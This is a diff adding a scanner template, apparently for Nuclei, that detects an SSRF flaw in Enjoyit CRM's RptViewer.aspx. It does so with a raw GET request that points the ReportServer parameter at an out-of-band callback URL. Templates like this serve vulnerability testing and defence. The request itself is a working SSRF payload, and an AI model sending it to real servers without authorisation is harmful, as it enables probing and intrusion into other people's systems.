@@ -1,0 +1,32 @@
+id: enjoyit-RptViewer-ssrf
+info:
+  name: 昂捷CRM RptViewer.aspx存在SSRF
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/58463/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: enjoyit,ssrf,oob
+
+http:
+  - raw:
+      - |
+        GET /WebForms/RptViewer.aspx?ReportServer=http://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+                
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
